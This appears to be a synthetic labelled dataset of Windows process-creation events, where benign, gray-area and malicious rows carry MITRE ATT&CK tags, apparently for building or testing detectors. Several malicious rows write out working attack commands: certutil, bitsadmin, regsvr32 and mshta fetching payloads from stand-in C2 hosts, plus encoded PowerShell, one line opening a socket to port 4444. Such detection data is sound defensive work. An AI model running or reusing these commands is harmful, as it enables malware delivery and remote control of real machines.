UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label
2024-07-02T15:47:12.240Z,{DC9483D6-13A5-4D7A-8C2F-7CA3EDAB4F7D},49197,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe https://sharepoint.corp.local/sites/team,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",16863,CORP\mjones,Medium,0,,,benign
2024-07-04T13:37:51.759Z,{F80C84DA-5CAC-4ACB-9EF4-58942D44CD62},60497,C:\Windows\System32\odbcad32.exe,odbcad32.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",50908,CORP\helpdesk,Medium,0,,,benign
2024-07-03T15:39:17.899Z,{8C1900FC-376D-49B3-9FC2-9A45D3563B2E},49042,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Installers\app_setup_3.2.42.msi /quiet,C:\Windows\explorer.exe,C:\Windows\explorer.exe,7091,CORP\admin,High,0,,,benign
2024-07-05T04:10:42.639Z,{F72BBAEB-B64A-4E9D-9D0A-D269B51B333F},48227,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k NetworkService,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,60113,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-04T05:31:52.920Z,{F04C5485-A054-4288-86D4-5FAD0A07822A},46193,C:\Windows\System32\wininit.exe,wininit.exe,C:\Windows\System32\smss.exe,smss.exe,47061,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T14:14:28.603Z,{7EE71AFD-6F9A-4F4B-A818-E13567BA3A2C},19231,C:\Program Files\Microsoft\Teams\current\Teams.exe,Teams.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",54046,CORP\jsmith,Medium,0,,,benign
2024-07-02T12:38:47.844Z,{6D51EAC7-0C5F-4B88-8B2F-37E08F8603EC},38303,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",61371,CORP\mjones,Medium,0,,,benign
2024-07-05T10:31:18.143Z,{48C4D452-8DA2-49E8-A290-5B15DDD91692},13261,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,21616,CORP\mjones,Medium,0,,,benign
2024-07-03T02:46:58.944Z,{DAC798CA-F33D-4ABD-91E7-A738844BC621},29973,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,cmd.exe,23196,CORP\mjones,Medium,1,T1059.001,PowerShell Encoded Command,malicious
2024-07-03T14:49:12.902Z,{25CFC9F8-24A5-44A8-95AD-3E1CC4A50054},20761,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s C:\Program Files\Common Files\System\Ole DB\oledb32.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,6523,CORP\itops,High,0,,,gray_area
2024-07-01T10:42:51.580Z,{213047FC-50B1-409D-AE75-7593B670B447},56853,C:\Windows\System32\mmc.exe,mmc.exe diskmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,4564,CORP\admin,High,0,,,benign
2024-07-01T16:56:08.450Z,{FFF3FD43-4901-442C-A6E8-7DFCE69B4313},11853,C:\Windows\System32\resmon.exe,resmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,16072,CORP\itops,High,0,,,benign
2024-07-05T17:30:15.803Z,{FABFF7D7-4115-476D-8C20-01F73DEDFCE3},31996,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",53920,CORP\dbadmin,Medium,0,,,benign
2024-07-04T08:46:09.419Z,{D5AD0691-224C-4F7B-84DD-F45809FC2193},58077,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",43911,CORP\helpdesk,Medium,0,,,benign
2024-07-01T10:19:00.971Z,{052FEF7A-928A-4BAF-93ED-B91353A273DB},26932,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,22772,CORP\sysadmin,High,0,,,benign
2024-07-02T17:38:29.646Z,{DEDBE847-3CD9-42DB-A4D0-D8D6B298BBD6},50080,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,msedge.exe --type=gpu-process,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",42671,CORP\dbadmin,Low,0,,,benign
2024-07-03T13:08:24.881Z,{210F7484-673A-46C6-9A56-2F995D734255},55982,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,38249,CORP\admin,High,0,,,benign
2024-07-02T00:39:54.372Z,{3C5D4B80-F167-4BFF-B3E2-1B56A55F47AA},51857,C:\Windows\System32\taskeng.exe,taskeng.exe {GUID} S,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,41645,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T11:44:15.585Z,{37D639B0-1A42-41B7-B2ED-125BB8321F49},26098,C:\Program Files\Slack\Slack.exe,Slack.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",16306,CORP\dbadmin,Medium,0,,,benign
2024-07-04T03:57:21.800Z,{1649896C-8673-4C29-9F6D-83185C8D2106},25727,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Restart-Service -Name W3SVC -Force""",C:\Windows\System32\cmd.exe,cmd.exe,32144,CORP\sysadmin,High,0,,,gray_area
2024-07-05T10:43:24.173Z,{5C792841-D927-46B0-B55D-FC296F422828},10099,C:\Windows\System32\cmd.exe,cmd.exe /c whoami,C:\Windows\explorer.exe,C:\Windows\explorer.exe,18623,CORP\netadmin,Medium,0,,,benign
2024-07-04T09:43:49.140Z,{B2AAC229-E6D9-460C-938C-C0139C167216},1339,C:\Windows\System32\cmd.exe,cmd.exe /c net user,C:\Windows\explorer.exe,C:\Windows\explorer.exe,64210,CORP\sysadmin,High,0,,,benign
2024-07-01T09:38:01.530Z,{242C0252-391B-4CA1-9815-725DF68D664E},9852,C:\Windows\System32\fontdrvhost.exe,fontdrvhost.exe,C:\Windows\System32\smss.exe,smss.exe,59348,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T01:46:04.854Z,{ADB7070B-CB9D-4BB2-A85D-BAF524DE6748},20916,C:\Windows\System32\taskeng.exe,taskeng.exe {GUID} S,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,6107,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T03:37:01.783Z,{6EA1A1F9-9DC0-49AE-A8F1-3FCBE52C6BD5},59415,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\runtime329.csproj,C:\Windows\System32\cmd.exe,powershell.exe,41970,CORP\jsmith,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-05T16:39:10.372Z,{2B51E73E-9032-4080-91E1-920565C32528},25435,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,61157,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-02T10:11:05.624Z,{87EF85B2-5BB3-4D11-8018-2E561DE0417D},58071,C:\Program Files\Slack\Slack.exe,Slack.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",26070,CORP\analyst02,Medium,0,,,benign
2024-07-02T04:36:42.410Z,{2FABA2F5-3B1A-4F29-8D9C-A169A7A0C725},5560,C:\Windows\System32\lsass.exe,C:\Windows\System32\lsass.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,10297,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T17:55:50.083Z,{8939ED90-E15C-49AE-A127-09F7D234221D},35439,C:\Windows\System32\cmd.exe,cmd.exe /c hostname,C:\Windows\explorer.exe,C:\Windows\explorer.exe,30278,CORP\itops,High,0,,,benign
2024-07-05T13:15:19.897Z,{B7C4B725-3CBC-4A13-AF0F-6C8C923FADC0},10388,C:\Windows\System32\cmd.exe,cmd.exe /c net user,C:\Windows\explorer.exe,C:\Windows\explorer.exe,44267,CORP\netadmin,Medium,0,,,benign
2024-07-05T18:17:54.148Z,{CB71C57D-2C89-4153-949C-99977B6DA98F},9519,C:\Windows\System32\notepad.exe,notepad.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",36403,CORP\mjones,Medium,0,,,benign
2024-07-03T17:30:12.980Z,{BDFB3987-F6F9-49D8-87A2-E73200774F9D},17155,C:\Windows\System32\cmd.exe,cmd.exe /c net localgroup administrators,C:\Windows\explorer.exe,C:\Windows\explorer.exe,19284,CORP\admin,High,0,,,benign
2024-07-04T16:27:34.388Z,{C6BE10A5-29E3-4FC8-9154-6D150EEBD9F5},54959,C:\Windows\System32\cmd.exe,cmd.exe /c ipconfig /all,C:\Windows\explorer.exe,C:\Windows\explorer.exe,16051,CORP\pchen,Medium,0,,,benign
2024-07-04T16:18:40.729Z,{8882B440-075F-4225-AC61-F599CC85EFF8},33836,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-WmiObject Win32_OperatingSystem | Select Caption, Version""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,51273,CORP\admin,High,0,,,benign
2024-07-05T01:13:53.877Z,{D0AC9678-9DF6-4B62-A406-2E6149327C7A},22482,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,10720,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T16:39:44.604Z,{86218875-9E49-4371-B44B-D199CE837117},17773,C:\Windows\System32\taskeng.exe,taskeng.exe {GUID} S,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,4216,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T13:59:32.108Z,{E1898C1C-B780-4C0E-B342-0CA32B8F04B0},19994,C:\Windows\System32\taskmgr.exe,taskmgr.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,52569,CORP\itops,High,0,,,benign
2024-07-03T18:02:04.072Z,{2F59BDF8-58B2-44A5-8E7E-2C6DC1553BDB},38443,C:\Windows\System32\certutil.exe,certutil  -urlcache -split -f http://darkops6442.org/downloads/core504.exe C:\Users\Public\svc148.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,48680,CORP\jsmith,Medium,1,T1105,Certutil Download,malicious
2024-07-02T01:31:37.994Z,{679F07F7-35EF-4DD6-AFE0-16296AC8716F},25759,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job6474 /download /priority high http://c2-server8062.io/helper320.exe C:\Users\Public\loader783.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,41431,CORP\klee,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-04T15:14:22.566Z,{6FDBCC57-8C41-416D-B510-79B5B6286672},62678,C:\Windows\System32\cmd.exe,cmd.exe /c dir C:\Users,C:\Windows\explorer.exe,C:\Windows\explorer.exe,25603,CORP\itops,High,0,,,benign
2024-07-04T02:05:20.056Z,{49E37D58-CE33-4620-B16E-970DDEE0B4A5},40855,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=,C:\Windows\System32\cmd.exe,cmd.exe,43029,CORP\jsmith,Medium,1,T1059.001,PowerShell Encoded Command,malicious
2024-07-04T11:28:51.298Z,{1B816D35-F846-45B8-83FD-55B379410852},55478,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,46405,CORP\agarwal,Medium,0,,,benign
2024-07-02T10:40:42.442Z,{DDB69EF6-6B57-4346-9E3E-1BB1EE335479},26924,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ChildItem -Path C:\Logs -Recurse -Filter *.log""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,2913,CORP\sysadmin,High,0,,,benign
2024-07-05T12:44:59.898Z,{65708679-D01F-4F97-9CF2-1084E03D43F0},25187,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,30798,CORP\admin,High,0,,,benign
2024-07-03T14:17:14.076Z,{A2A270CB-C25D-4F4C-B1E4-132319F7C29C},62836,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,14284,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T12:14:23.081Z,{97928ADC-BF61-4BF6-A7D6-B16D207DF91E},40913,C:\Program Files\Microsoft OneDrive\OneDrive.exe,OneDrive.exe /sync,C:\Program Files\Microsoft Office\root\Office16\POWERPNT.EXE,"""C:\Program Files\Microsoft Office\root\Office16\POWERPNT.EXE""",3474,CORP\agarwal,Medium,0,,,benign
2024-07-02T07:37:20.825Z,{BC91EB97-EBFF-483A-AB93-4AF5BF994178},49372,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,46719,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T11:26:48.648Z,{93650D7F-D600-4BE7-905B-BD80F4940FDC},29219,C:\Windows\System32\dwm.exe,dwm.exe,C:\Windows\System32\smss.exe,smss.exe,55142,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T14:11:53.786Z,{5CD12658-756E-413B-83B6-E11819C69BF8},54206,C:\Windows\System32\wbem\WMIC.exe,"wmic.exe diskdrive get model,size,status",C:\Windows\System32\cmd.exe,cmd.exe,46680,CORP\itops,High,0,,,gray_area
2024-07-03T11:33:27.302Z,{290807E0-A748-473E-99B9-C733F18E3A8E},38259,C:\Windows\System32\certutil.exe,certutil.exe -verify -urlfetch C:\Certs\server16.cer,C:\Windows\System32\cmd.exe,cmd.exe,4127,CORP\admin,High,0,,,gray_area
2024-07-04T15:41:13.908Z,{2D764E9B-8DDE-436B-9931-FEFB5983A03F},36679,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s C:\Program Files\Microsoft Office\root\Office16\GROOVEEX.DLL,C:\Windows\System32\cmd.exe,cmd.exe /c,41918,CORP\itops,High,0,,,gray_area
2024-07-05T02:25:55.317Z,{D46D90F0-45FE-4994-9F65-918584AEEF31},49877,C:\Program Files\Windows Defender\MsMpEng.exe,"""C:\Program Files\Windows Defender\MsMpEng.exe""",C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,23250,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-03T15:16:13.477Z,{3A5743B5-1800-4400-8449-6AA9356E3E27},20801,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Temp\update_5.6.48.msi /passive /norestart,C:\Windows\explorer.exe,C:\Windows\explorer.exe,45380,CORP\itops,High,0,,,benign
2024-07-05T23:35:26.764Z,{882F0C63-5C80-4DB1-BA8F-69414C8D7094},7914,C:\Windows\System32\schtasks.exe,"schtasks.exe /run /tn ""\Microsoft\Windows\WindowsUpdate\Automatic App Update""",C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,51219,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T09:43:42.504Z,{8389CDF9-B3FE-4E88-AA56-154A973408C1},41227,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer --field-trial-handle=12345,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",1434,CORP\agarwal,Low,0,,,benign
2024-07-05T18:03:27.678Z,{289E09C5-165F-4BF3-931B-2FF2A3EAFD17},64191,C:\Windows\System32\wuauclt.exe,wuauclt.exe /detectnow /updatenow,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,9566,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T15:45:59.158Z,{1AC50B77-C47A-4EEF-8F06-3B49688CBD66},3617,C:\Windows\System32\mmc.exe,mmc.exe diskmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,11073,CORP\admin,High,0,,,benign
2024-07-04T13:35:59.956Z,{B7C8FD14-B6E9-4293-8E91-45786DCB0A57},53127,C:\Windows\System32\cmd.exe,cmd.exe /c type C:\Windows\System32\drivers\etc\hosts,C:\Windows\explorer.exe,C:\Windows\explorer.exe,48294,CORP\analyst01,Medium,0,,,benign
2024-07-03T10:06:05.335Z,{46E93871-3340-450F-BE0C-3058C971A157},44314,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k NetworkService,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,20375,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-02T13:31:56.387Z,{591AF429-7875-4454-9A9E-6374B3163771},24018,C:\Windows\System32\UsoClient.exe,UsoClient.exe StartInteractiveScan,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,36784,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T17:50:20.884Z,{E95A2A14-DBB7-407F-BE79-80A9EA9A4268},26246,C:\Windows\System32\cmd.exe,cmd.exe /c net use Z: \\fileserver\share,C:\Windows\explorer.exe,C:\Windows\explorer.exe,1808,CORP\agarwal,Medium,0,,,benign
2024-07-01T15:28:51.586Z,{46C168CB-E282-48F1-A16C-63B93EDDEA97},30366,C:\Users\itops\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,6768,CORP\itops,High,0,,,benign
2024-07-04T16:31:03.995Z,{9AFC360E-6420-4D40-B17C-3DD1F326F138},23571,C:\Windows\System32\cmd.exe,cmd.exe /c systeminfo,C:\Windows\explorer.exe,C:\Windows\explorer.exe,62707,CORP\admin,High,0,,,benign
2024-07-01T09:06:34.172Z,{26AF4673-5563-42A1-A2CA-B1CC14591EEF},19700,C:\Windows\System32\schtasks.exe,"schtasks.exe /run /tn ""\Microsoft\Windows\Defrag\ScheduledDefrag""",C:\Windows\System32\cmd.exe,cmd.exe,10439,CORP\sysadmin,High,0,,,gray_area
2024-07-04T08:10:18.743Z,{A3BC98D7-85E1-4E6E-BF2E-F01582C65F55},13596,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://fileserver.corp.local/package29.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,31752,CORP\itops,High,0,,,gray_area
2024-07-03T03:50:09.145Z,{8D1D08D8-D838-464F-9A3B-702C735932E5},52366,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -File C:\Scripts\nightly-backup.ps1,C:\Windows\System32\cmd.exe,cmd.exe,39641,CORP\sysadmin,High,0,,,gray_area
2024-07-02T16:20:25.600Z,{626878E6-19AA-43FF-BA5F-4B0A7DE7F507},42569,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Test-Connection -ComputerName fileserver -Count 4""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,51018,CORP\admin,High,0,,,benign
2024-07-03T08:54:20.948Z,{075A0B76-2DE8-4544-AA20-97B63DFD03E3},53482,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,26752,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T03:12:21.130Z,{75BEEF3A-A526-4A89-9E77-901B6245A956},3103,C:\Windows\System32\regsvr32.exe,regsvr32 /s /n /u /i:http://c2-server3551.ru/payloads/file183.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,46364,CORP\mjones,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-02T21:13:22.816Z,{E6520D41-96FA-4597-93C4-7BBDFC6DF22B},17931,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --no-first-run,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",23304,CORP\helpdesk,Medium,0,,,benign
2024-07-03T22:25:29.791Z,{857B7F7B-C0C6-4F79-9087-76CCD24C60EB},45255,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -f http://apt-infra682.net/module653.exe C:\Users\Public\patch980.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,50092,CORP\mjones,Medium,1,T1105,Certutil Download,malicious
2024-07-02T16:42:15.583Z,{74C45D8F-7AAF-475C-A031-E18794E65CDD},41981,C:\Windows\System32\schtasks.exe,"schtasks.exe /run /tn ""\Microsoft\Windows\WindowsUpdate\Automatic App Update""",C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,63095,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T11:03:37.753Z,{2D4EEEDE-E533-43A5-AE03-AC49376B1B85},36533,C:\Program Files\Slack\Slack.exe,Slack.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",4994,CORP\helpdesk,Medium,0,,,benign
2024-07-03T11:48:53.692Z,{CC655414-A515-4414-99BC-BC6A7FD2D619},26736,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-EventLog -LogName System -Newest 50""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,33077,CORP\sysadmin,High,0,,,benign
2024-07-05T12:22:01.421Z,{F5F5401C-8B95-42E0-AA31-88B1A47B40F6},8945,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe -contentproc -childID 7,C:\Program Files\Mozilla Firefox\firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe""",24009,CORP\dbadmin,Low,0,,,benign
2024-07-04T17:36:25.869Z,{ED24E269-0A0F-4672-B4AC-0E02C8C8679D},60445,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer --field-trial-handle=12345,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",5675,CORP\analyst01,Low,0,,,benign
2024-07-02T11:47:18.453Z,{F9971A16-1A1A-46F3-8A6B-FA6868F66BDE},42057,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe -contentproc -childID 7,C:\Program Files\Mozilla Firefox\firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe""",9284,CORP\pchen,Low,0,,,benign
2024-07-03T02:59:37.041Z,{FAACEF10-76D7-4DB0-9DA5-94DB46F280B5},9740,C:\Windows\System32\mshta.exe,mshta.exe http://loader-cdn756.org/script344.hta,C:\Windows\explorer.exe,cmd.exe,7551,CORP\klee,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-01T11:27:56.409Z,{1EE280B0-0DBD-4992-B740-8B2A215CCF90},49713,C:\Windows\System32\lsass.exe,C:\Windows\System32\lsass.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,29818,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-01T08:47:16.207Z,{CEA78A52-962B-45EE-865D-1C02F141B05E},41669,C:\Windows\System32\perfmon.exe,perfmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,57940,CORP\itops,High,0,,,benign
2024-07-05T21:50:28.035Z,{8F81149D-1528-4A9E-BC31-01EAB3293E64},9272,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,5406,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T12:39:47.862Z,{1DF6C1E3-7810-4191-A706-2892E1996218},20610,C:\Program Files\Windows Defender\MsMpEng.exe,"""C:\Program Files\Windows Defender\MsMpEng.exe""",C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,39910,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-01T10:00:22.808Z,{D5E5B604-0F7E-4257-AE4C-2FAE53A74EDB},52670,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",16593,CORP\mjones,Medium,0,,,benign
2024-07-05T16:26:10.836Z,{50CE5C9C-2382-4E95-B64D-6A12DFE0EA7E},14087,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,53511,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
